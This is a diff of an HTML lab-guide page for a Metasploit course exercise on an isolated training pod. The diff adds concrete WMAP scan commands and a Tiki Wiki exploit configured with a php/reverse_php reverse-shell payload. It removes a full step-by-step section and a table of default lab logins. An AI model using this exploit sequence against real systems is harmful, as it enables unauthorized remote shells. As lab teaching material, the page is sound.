@@ -191,40 +191,6 @@
   .evidence li input{width:20px;height:20px;margin-top:.12rem;accent-color:var(--violet);flex:none}
   .evidence .shot{font-weight:600;color:var(--ink)}
   @media print{.evidence li input{-webkit-appearance:checkbox;appearance:checkbox}}
-
-#fullsteps .step h3.fh{font-weight:600;font-size:.95rem;line-height:1.5;margin:0;display:block}
-#fullsteps .step h3.fh .n{margin-right:.5rem}
-#fullsteps .shotmark{margin:.55rem 0 0;padding:.5rem .7rem;border-left:3px solid var(--accent);background:var(--surface-2);border-radius:6px;font-size:.88rem;color:var(--ink)}
-#fullsteps .shotmark b{color:var(--accent)}
-
-.pm-toggle.ctl{cursor:pointer}
-html[data-present="on"] nav.toc,
-html[data-present="on"] .hero .lede,
-html[data-present="on"] .hero .chips,
-html[data-present="on"] footer.site,
-html[data-present="on"] .done-row{display:none!important}
-html[data-present="on"] #main{max-width:100%}
-html[data-present="on"] .hero{margin-top:.6rem}
-html[data-present="on"] .hero h1{font-size:1.25rem;margin-top:.2rem}
-html[data-present="on"] #main > section{display:none;margin-top:1rem}
-html[data-present="on"] #main > section.pm-current{display:block;animation:pm-fade .18s ease;font-size:1.04rem}
-@keyframes pm-fade{from{opacity:0}to{opacity:1}}
-html[data-present="on"] .call.auth{display:none!important}
-html[data-present="on"][data-pm-index="0"] .call.auth{display:block!important}
-.pm-dock{display:none}
-html[data-present="on"] .pm-dock{position:fixed;left:0;right:0;bottom:0;z-index:2147483100;display:flex;
-  align-items:center;gap:8px;padding:8px 12px;background:var(--surface);border-top:1px solid var(--border);
-  padding-bottom:calc(8px + env(safe-area-inset-bottom,0px))}
-.pm-dock button{flex:0 0 auto;min-height:40px;min-width:44px;padding:0 14px;cursor:pointer;background:var(--surface-2);
-  color:var(--ink);border:1px solid var(--border);border-radius:8px;font:inherit;font-size:.85rem}
-.pm-dock button:hover{background:var(--accent);color:var(--accent-ink,#06240f)}
-.pm-dock button:disabled{opacity:.4;cursor:not-allowed}
-.pm-dock button:disabled:hover{background:var(--surface-2);color:var(--ink)}
-.pm-dock .pm-where{flex:1 1 auto;text-align:center;min-width:0;font-size:.78rem;color:var(--muted)}
-.pm-dock .pm-where b{color:var(--ink);display:block;font-size:.9rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-@media print{.pm-dock,.pm-toggle{display:none!important}}
-html[data-present="on"] #ca-launch{display:none!important}
-
 </style>
 </head>
 <body>
@@ -240,7 +206,6 @@ html[data-present="on"] #ca-launch{display:none!important}
       </div>
       <button class="ctl" id="theme-toggle" aria-pressed="false">🌙 Dark</button>
       <button class="ctl" id="print-btn">🖨 Print</button>
-          <button class="ctl pm-toggle" id="pmToggle" type="button">⇤ Lab mode</button>
       <button class="ctl" id="clear-btn">Clear progress</button>
     </div>
   </div>
@@ -273,7 +238,6 @@ html[data-present="on"] #ca-launch{display:none!important}
       <li><a href="#overview">Overview</a></li>
       <li><a href="#environment">The environment</a></li>
       <li><a href="#walkthrough">Command walkthrough</a></li>
-      <li><a href="#fullsteps">Full lab steps</a></li>
       <li><a href="#reference">Command reference</a></li>
       <li><a href="#stuck">Where people get stuck</a></li>
       <li><a href="#defend">The defender's view</a></li>
@@ -294,7 +258,6 @@ html[data-present="on"] #ca-launch{display:none!important}
   <section id="environment" data-track>
     <h2>The environment you're working in</h2>
     <p>You run Metasploit from <strong>Kali</strong> against the intentionally vulnerable targets in the pod (the OWASP/Mutillidae web app and a Metasploitable-style host). The database stores hosts and services as you discover them, so later modules can draw on what earlier steps found.</p>
-    <div class="tbl-wrap"><table id="cred-table"><thead><tr><th>Machine</th><th>Address</th><th>Sign-in (user / pass)</th></tr></thead><tbody><tr><td><b>Kali Linux</b></td><td><code>192.168.9.2 / 192.168.0.2</code></td><td><code>root</code> / <code>toor</code></td></tr><tr><td><b>OWASP BWA</b></td><td><code>192.168.68.12</code></td><td><code>root</code> / <code>owaspbwa</code></td></tr><tr><td><b>pfSense</b></td><td><code>192.168.0.254 / 192.168.68.254</code></td><td><code>admin</code> / <code>pfsense</code></td></tr></tbody></table></div><p class="muted" style="font-size:.84rem;color:var(--muted)">Fixed NETLAB+ pod logins for this lab (case-sensitive); the same every time the pod resets.</p>
     <div class="done-row"><input type="checkbox" id="done-environment" data-done="environment"><label for="done-environment">Mark this section reviewed</label></div>
   </section>
 
@@ -312,111 +275,39 @@ html[data-present="on"] #ca-launch{display:none!important}
     <p class="task-head">Task 2 — Scan a web app with the WMAP module</p>
     <div class="step">
       <h3><span class="n">2</span> Load and run WMAP</h3>
-      <div class="cmd"><pre><span class="p">msf6 ></span> load wmap</pre></div>
-      <div class="cmd"><pre><span class="p">msf6 ></span> wmap_sites <span class="fl">-a</span> <span class="ar">http://TARGET</span>
-<span class="p">msf6 ></span> wmap_targets <span class="fl">-t</span> <span class="ar">http://TARGET</span>
-<span class="p">msf6 ></span> wmap_run <span class="fl">-e</span></pre></div>
-      <p>WMAP is an <strong>auxiliary</strong> module — a scanner, not an exploit. You register a site, point it at a target, and run the enabled checks. The findings land in the database, ready for the next step. It's a tidy example of the module workflow with nothing dangerous happening.</p>
-      <div class="call capture"><span class="k">📸 Screenshot for your report</span><p>Capture the WMAP results (<code class="inl">wmap_vulns -l</code>) or the scan summary for the target site.</p></div>
+      <div class="cmd"><pre><span class="p">msf6 ></span> load wmap
+<span class="p">msf6 ></span> wmap_sites <span class="fl">-a</span> <span class="ar">http://192.168.68.12</span></pre></div>
+      <div class="cmd"><pre><span class="p">msf6 ></span> cat /root/profile
+<span class="p">msf6 ></span> wmap_run <span class="fl">-e</span> <span class="ar">/root/profile</span>
+<span class="p">msf6 ></span> wmap_vulns <span class="fl">-l</span></pre></div>
+      <p>WMAP is an <strong>auxiliary</strong> module — a scanner, not an exploit. You <code class="inl">load</code> it, register the OWASP site with <code class="inl">wmap_sites -a</code>, then run it. The lab uses a <strong>predefined profile</strong> (<code class="inl">/root/profile</code>, which <code class="inl">cat</code> shows is a curated list of WMAP modules) via <code class="inl">wmap_run -e /root/profile</code>, and lists the findings with <code class="inl">wmap_vulns -l</code>. They land in the database for the next step. (<code class="inl">help</code> and <code class="inl">wmap_sites -h</code> show the full command set.)</p>
+      <div class="call capture"><span class="k">📸 Screenshot for your report</span><p>Capture the <code class="inl">wmap_vulns -l</code> output for the target site.</p></div>
     </div>
 
-    <p class="task-head">Task 3 — The find → configure workflow</p>
+    <p class="task-head">Task 3 — Configure and run an exploit</p>
     <div class="step">
-      <h3><span class="n">3</span> Search, select, and inspect a module</h3>
-      <div class="cmd"><pre><span class="p">msf6 ></span> search <span class="ar">type:exploit name:TERM</span></pre></div>
-      <div class="cmd"><pre><span class="p">msf6 ></span> use <span class="ar">MODULE_PATH</span>
+      <h3><span class="n">3</span> The find → configure → run loop, for real</h3>
+      <p>The lab now exploits a known flaw in the training app's old Tiki Wiki. The sequence is the same loop you'll repeat forever — <code class="inl">search</code> to find a module, <code class="inl">use</code> to select it, <code class="inl">set</code> the required options (<code class="inl">show options</code> marks them <em>yes</em>), then <code class="inl">exploit</code>:</p>
+      <div class="cmd"><pre><span class="p">msf6 ></span> use <span class="ar">exploit/unix/webapp/tikiwiki_graph_formula_exec</span>
+<span class="p">msf6 ></span> set RHOST <span class="ar">192.168.68.12</span>
+<span class="p">msf6 ></span> set payload <span class="ar">php/reverse_php</span>
+<span class="p">msf6 ></span> set LHOST <span class="ar">eth0</span>
+<span class="p">msf6 ></span> set LPORT <span class="ar">5656</span>
 <span class="p">msf6 ></span> show options
-<span class="p">msf6 ></span> info</pre></div>
-      <p>This is the loop you'll repeat forever: <code class="inl">search</code> to find a module, <code class="inl">use</code> to select it, <code class="inl">show options</code> to see the required settings (the ones marked <em>yes</em> you must fill in), <code class="inl">set NAME value</code> to configure them, and <code class="inl">info</code> to read what it does before you run anything. Configuring a module safely — reading <code class="inl">info</code> first — is the habit that separates a professional from a button-masher.</p>
+<span class="p">msf6 ></span> exploit</pre></div>
+      <p><code class="inl">RHOST</code> is the victim; the <strong>payload</strong> (<code class="inl">php/reverse_php</code>) is what runs after the exploit lands, calling back to your <code class="inl">LHOST</code>/<code class="inl">LPORT</code> — an in-memory reverse connection that leaves nothing on disk. A successful <code class="inl">exploit</code> reports a <strong>command shell session opened</strong>. (Interact within ~30 seconds or the session times out; if no session is created, just run <code class="inl">exploit</code> again.) This is a documented module against an intentionally vulnerable training app in the isolated pod.</p>
+      <div class="call capture"><span class="k">📸 Screenshot for your report</span><p>Capture the "session opened" message confirming the exploit succeeded.</p></div>
     </div>
 
     <p class="task-head">Task 4 — Armitage, the GUI</p>
     <div class="step">
-      <h3><span class="n">4</span> Visualize the same framework</h3>
-      <p>Armitage is a graphical front-end to Metasploit: it draws hosts on a canvas, runs <code class="inl">db_nmap</code> scans, and exposes the same modules through menus. It's useful for seeing the structure at a glance.</p>
+      <h3><span class="n">4</span> Visualize — and repeat — the same framework</h3>
+      <p>Armitage is a graphical front-end to Metasploit: it draws hosts on a canvas and exposes the same modules through menus. In the lab you <strong>Clear Database</strong>, then <strong>Hosts → Nmap scan → Intense scan</strong> to rediscover <code class="inl">192.168.68.12</code>, select the host, choose <strong>Attacks → Find Attacks</strong>, and then run the <em>same</em> exploit from the tree (<strong>exploit → unix → webapp → tikiwiki_graph_formula_exec</strong>) — proof the GUI is just a skin over the console commands you already ran.</p>
       <details class="go"><summary>Currency note — Armitage in 2026</summary><p>Armitage is <strong>no longer actively maintained</strong> and isn't in current Kali by default; the modern graphical option for team engagements is <em>Metasploit Pro</em> or a C2 framework. Learn Armitage here to <em>see</em> the workflow, but expect to live in <code class="inl">msfconsole</code> in practice — the CLI is where the framework actually stays current.</p></details>
       <div class="call capture"><span class="k">📸 Screenshot for your report</span><p>Capture Armitage's host view after a scan, showing the discovered targets on the canvas.</p></div>
     </div>
     <div class="done-row"><input type="checkbox" id="done-walkthrough" data-done="walkthrough"><label for="done-walkthrough">Mark this section reviewed</label></div>
   </section>
-
-<section id="fullsteps" data-track>
-<h2>Full lab steps</h2>
-<p>Every step from the NDG lab guide, in order — enough to run the lab end to end from this page. The command walkthrough above explains the key commands and the <em>why</em>; this is the complete click-by-click checklist. Watch for the 📸 markers — those are the moments worth a screenshot.</p>
-<p class="task-head">Task 1 - Getting Familiar with Metasploit</p>
-<div class="step"><h3 class="fh"><span class="n">1</span> Click on the Kali tab.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">2</span> Click within the console window and press Enter to display the login prompt.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">3</span> Enter root as the username. Press Tab.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">4</span> Enter toor as the password. Click Log In.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">5</span> Open a new terminal by clicking on the Terminal icon located at the top of the page if the terminal is not already opened.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">6</span> First, you must initialize the Metasploit database by running the following command:</h3><div class="cmd"><pre>msfdb init</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">7</span> After that database is configured, we need to start the Postgres database server with the following command:</h3><div class="cmd"><pre>service postgresql start</pre></div></div>
-<div class="shotmark">📸 <b>Screenshot for your report:</b> <span class="shot">Console up.</span> <code class="inl">msfconsole</code> with <code class="inl">db_status</code> showing the database connected.</div><div class="step"><h3 class="fh"><span class="n">8</span> Use the following command to launch msfconsole:</h3><div class="cmd"><pre>msfconsole</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">9</span> Notice once the msfconsole appears, a banner is displayed. By default, the command below, followed by pressing the Enter key.</h3><div class="cmd"><pre>banner chooses from random upon startup. Change the banner by typing the
-banner</pre></div><div class="call tip"><span class="k">Note</span><p>Note that a random banner is generated. The graphic above is an example.</p></div></div>
-<div class="step"><h3 class="fh"><span class="n">10</span> Get familiarized with the basic Metasploit commands. Type the command below, followed by pressing the Enter key.</h3><div class="cmd"><pre>help</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">11</span> While in the msfconsole, note that terminal commands can still be used. Enter the command below.</h3><div class="cmd"><pre>ifconfig</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">12</span> Netcat is also made available within the msfconsole. To connect to various services, use the connect command to try to connect to the OWASP web server using netcat.</h3><div class="cmd"><pre>connect 192.168.68.12 80</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">13</span> Press CTRL-C to break the connection.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">14</span> To view all the modules available, enter the following command:</h3><div class="cmd"><pre>show all</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">15</span> View all the exploits and payloads available.</h3><div class="cmd"><pre>show exploits</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">16</span> View the payloads available.</h3><div class="cmd"><pre>show payloads</pre></div></div>
-<p class="task-head">Task 2 - Vulnerability Scanning Using the WMAP Module</p>
-<div class="step"><h3 class="fh"><span class="n">1</span> Metasploit also contains vulnerability scanning modules. Load the web application scanner plugin WMAP by entering the command below.</h3><div class="cmd"><pre>load wmap</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">2</span> View the available wmap commands, type the command below, followed by pressing the Enter key.</h3><div class="cmd"><pre>help</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">3</span> View the wmap_sites options for managing sites.</h3><div class="cmd"><pre>wmap_sites -h</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">4</span> Add the OWASP site.</h3><div class="cmd"><pre>wmap_sites -a http://192.168.68.12</pre></div></div>
-<div class="shotmark">📸 <b>Screenshot for your report:</b> <span class="shot">WMAP results.</span> The web-scan findings for the target site.</div><div class="step"><h3 class="fh"><span class="n">5</span> Confirm that the OWASP site has been successfully created.</h3><div class="cmd"><pre>wmap_sites -l</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">6</span> Load the vulnerabilities using the module called mutillidae.</h3><div class="cmd"><pre>wmap_targets -t http://192.168.68.12/mutillidae/index.php</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">7</span> Confirm that the target has been successfully added.</h3><div class="cmd"><pre>wmap_targets -l</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">8</span> View the options available when attempting to scan a target.</h3><div class="cmd"><pre>wmap_run -h</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">9</span> Show all enabled target modules for WMAP to choose from.</h3><div class="cmd"><pre>wmap_run -t</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">10</span> Type the command below to view the contents of a profile that will be used to initiate a WMAP scan. Notice the modules that are included in the profile.</h3><div class="cmd"><pre>cat /root/profile</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">11</span> Run the WMAP scanner using the predefined profile with selective WMAP modules. Allow 1-2 minutes for the scan to complete before continuing on to the next step.</h3><div class="cmd"><pre>wmap_run -e /root/profile</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">12</span> View the vulnerabilities that were found by the scanner.</h3><div class="cmd"><pre>wmap_vulns -l</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">13</span> Leave the terminal window open to continue with the next task.</h3></div>
-<p class="task-head">Task 3 - Configuring Exploits and Payloads</p>
-<div class="step"><h3 class="fh"><span class="n">1</span> The OWASP server runs a piece of software for content management known as TikiWiki CMS. The particular version it is running on now is vulnerable. Search for available exploits for this software.</h3><div class="cmd"><pre>search tikiwiki</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">2</span> Use the tikiwiki_graph_formula_exec module to try a remote PHP execution. Before executing, use the info command to show more information about the module.</h3><div class="cmd"><pre>info exploit/unix/webapp/tikiwiki_graph_formula_exec</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">3</span> After viewing the given information, use the exploit to gain access to the server. use exploit/unix/webapp/tikiwiki_graph_formula_exec</h3></div>
-<div class="step"><h3 class="fh"><span class="n">4</span> Once the exploit is loaded, identify the available options. show options</h3></div>
-<div class="step"><h3 class="fh"><span class="n">5</span> Set the remote target for the exploit. Now that the exploit has been chosen and set, the next step would be to choose a payload to use after the target is exploited. In this scenario, a payload will be injected into the server's memory and not leave anything on the machine. Meterpreter will be used to get into the memory of the target after it is exploited. This will help enable and maintain a connection to the server; using a reverse TCP technique back to the Kali machine.</h3><div class="cmd"><pre>set RHOST 192.168.68.12</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">6</span> Set the payload using reverse PHP.</h3><div class="cmd"><pre>set payload php/reverse_php</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">7</span> Set the listener for the connection to the Kali's local eth0 interface.</h3><div class="cmd"><pre>set LHOST eth0</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">8</span> Change the listener port to 5656.</h3><div class="cmd"><pre>set LPORT 5656</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">9</span> Confirm that all of the configuration are loaded before the exploit is initiated. show options</h3></div>
-<div class="step"><h3 class="fh"><span class="n">10</span> Once everything is configured, initiate the exploit on the target. This indicates that the OWASP server has been exploited, and a remote connection has been established. timeout and disconnect. If this happens, just initiate the exploit command again. If you get a follow-up message stating that no session was created, initiate the exploit command once more.</h3><div class="cmd"><pre>exploit</pre></div><div class="call tip"><span class="k">Note</span><p>Given the output, notice the message that a command shell session is opened. Note: If you do not interact with the session within the first 30 seconds, it will</p></div></div>
-<div class="step"><h3 class="fh"><span class="n">11</span> Notice a shell session is now available. Enter the command below to identify which user you are currently engaged with and then print the current working directory.</h3><div class="cmd"><pre>whoami
-pwd</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">12</span> Identify which current working directory you are in.</h3><div class="cmd"><pre>pwd</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">13</span> Type exit and press Enter to close the session.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">14</span> Once the session closes, type exit to leave the Metasploit Framework. Leave the terminal window open for the next section.</h3></div>
-<p class="task-head">Task 4 - Starting Armitage and Scanning Hosts</p>
-<div class="step"><h3 class="fh"><span class="n">1</span> In the terminal window, use the following command to start Armitage:</h3><div class="cmd"><pre>armitage</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">2</span> In the Connect… window, click Connect to connect to the local Metasploit database.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">3</span> In the Start Metasploit? Window, click yes to start the Metasploit RPC server.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">4</span> In the Armitage window, you will see the host 192.168.68.12 is already in the database from the previous sections. Let's clear the database by clicking Hosts &gt; Clear Database.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">5</span> In the Clear Database window, click Yes to continue.</h3><div class="call tip"><span class="k">Note</span><p>Note that the 192.168.68.12 host disappeared.</p></div></div>
-<div class="step"><h3 class="fh"><span class="n">6</span> Now we will use the power of nmap to search for hosts. We will start with a simple intense scan of the 192.168.68.12 host. Select Hosts &gt; Nmap scan &gt; Intense scan.</h3></div>
-<div class="shotmark">📸 <b>Screenshot for your report:</b> <span class="shot">Armitage canvas.</span> The discovered hosts after a scan.</div><div class="step"><h3 class="fh"><span class="n">7</span> In the Input window, enter the following and click OK.</h3><div class="cmd"><pre>192.168.68.12
-nmap -T4 -A -v 192.168.68.12</pre></div><div class="call tip"><span class="k">Note</span><p>Note: This is running a nmap scan equivalent to the following:</p></div></div>
-<div class="step"><h3 class="fh"><span class="n">8</span> The scan will take minutes to finish. Once finished, a pop-up message window will appear, click OK to continue.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">9</span> We now have the 192.168.68.12 host in the center pane. It has been recognized as a Linux host. To help us remember this is the OWASP box, you can set a label. Right-click on 192.168.68.12 host, select Host -&gt; Set label…</h3></div>
-<div class="step"><h3 class="fh"><span class="n">10</span> In the Input window, enter the following and click OK.</h3><div class="cmd"><pre>OWASP</pre></div></div>
-<div class="step"><h3 class="fh"><span class="n">11</span> Leave the Armitage window open to continue with the next task.</h3></div>
-<p class="task-head">Task 5 - Finding and Executing Attacks in Armitage</p>
-<div class="step"><h3 class="fh"><span class="n">1</span> Click the 192.168.68.12 host to select it. You should see a green rectangular box around it.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">2</span> Select Attacks &gt; Find Attacks.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">3</span> In the Message window, click OK.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">4</span> You are going to run the same exploit we did in the msfconsole. In the left column, navigate to exploit &gt; unix &gt; webapp and double-click tikiwiki_graph_formula_exec to open the Attack window. To see all the possible exploits, you can right-click on the host, select Attack and work your way through the list. However, due to the Java design, this can be a bit cumbersome.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">5</span> In the Attack window, note all the information is automatically filled out. Click Launch to try and create a session.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">6</span> Notice that a command shell session 1 opened. The icon for the 192.168.68.12 host now has some lighting graphics, signaling that you have access to the system.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">7</span> In the console pane on the bottom, while having the exploit tab selected, scroll to the top and identify the payload that was used by the program. Notice a different payload was used compared to the php/reverse_php that was used earlier in Task 3.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">8</span> Right-click the 192.168.68.12 host, select Shell 1 -&gt; Interact.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">9</span> In the console pane below, notice a shell named "Shell 1" is opened, type whoami to determine which user you are on the system. Notice it returns the www-data user. You may have limited access with this user and would probably want to get privilege escalation in order to obtain more information. This goes beyond the scope of this lab.</h3></div>
-<div class="step"><h3 class="fh"><span class="n">10</span> You may now end your reservation.</h3></div>
-<div class="done-row"><input type="checkbox" id="done-fullsteps" data-done="fullsteps"><label for="done-fullsteps">Mark this section reviewed</label></div>
-</section>
 
   <section id="reference" data-track>
     <h2>Command reference — beyond the lab</h2>
@@ -622,55 +513,6 @@ nmap -T4 -A -v 192.168.68.12</pre></div><div class="call tip"><span class="k">No
     document.querySelectorAll(".q .reveal").forEach(function(btn){btn.setAttribute("aria-expanded","false");btn.textContent="Show answer";});
     refresh();
   });
-})();
-</script>
-<script src="assistant.js" defer></script>
-
-<script>
-(function(){
-  "use strict";
-  var root=document.documentElement,slides=[],idx=0,toggle,dock,prevBtn,nextBtn,countEl,nameEl;
-  function labelFor(s){var h=s.querySelector("h2");return h?h.textContent.trim():s.id;}
-  function show(i){
-    idx=Math.max(0,Math.min(slides.length-1,i));
-    slides.forEach(function(s,n){s.classList.toggle("pm-current",n===idx);});
-    root.setAttribute("data-pm-index",String(idx));
-    if(countEl)countEl.textContent=(idx+1)+" / "+slides.length;
-    if(nameEl)nameEl.textContent=labelFor(slides[idx]);
-    if(prevBtn)prevBtn.disabled=idx===0;
-    if(nextBtn)nextBtn.disabled=idx===slides.length-1;
-    window.scrollTo(0,0);
-  }
-  function enter(){
-    slides=Array.prototype.slice.call(document.querySelectorAll("#main > section"));
-    if(!slides.length)return;
-    root.setAttribute("data-present","on");
-    if(dock)dock.setAttribute("aria-hidden","false");
-    if(toggle)toggle.textContent="\u21E4 Exit lab mode";
-    show(0);
-  }
-  function exit(){
-    root.removeAttribute("data-present");root.removeAttribute("data-pm-index");
-    slides.forEach(function(s){s.classList.remove("pm-current");});
-    if(dock)dock.setAttribute("aria-hidden","true");
-    if(toggle)toggle.textContent="\u21E4 Lab mode";
-  }
-  toggle=document.getElementById("pmToggle");
-  if(toggle)toggle.addEventListener("click",function(){root.getAttribute("data-present")==="on"?exit():enter();});
-  dock=document.createElement("div");dock.className="pm-dock";dock.id="pmDock";dock.setAttribute("aria-hidden","true");
-  dock.innerHTML='<button type="button" data-pm="prev">\u25C0 Prev</button>'+
-    '<div class="pm-where"><span id="pmCount"></span><b id="pmName"></b></div>'+
-    '<button type="button" data-pm="next">Next \u25B6</button>'+
-    '<button type="button" data-pm="exit" aria-label="Exit lab mode">\u2715</button>';
-  document.body.appendChild(dock);
-  prevBtn=dock.querySelector('[data-pm="prev"]');nextBtn=dock.querySelector('[data-pm="next"]');
-  countEl=dock.querySelector("#pmCount");nameEl=dock.querySelector("#pmName");
-  dock.addEventListener("click",function(e){var t=e.target.closest("[data-pm]");if(!t)return;
-    var a=t.getAttribute("data-pm");if(a==="prev")show(idx-1);else if(a==="next")show(idx+1);else exit();});
-  document.addEventListener("keydown",function(e){if(root.getAttribute("data-present")!=="on")return;
-    if(e.key==="ArrowRight"||e.key==="PageDown"){show(idx+1);e.preventDefault();}
-    else if(e.key==="ArrowLeft"||e.key==="PageUp"){show(idx-1);e.preventDefault();}
-    else if(e.key==="Escape"){exit();}});
 })();
 </script>
 </body>
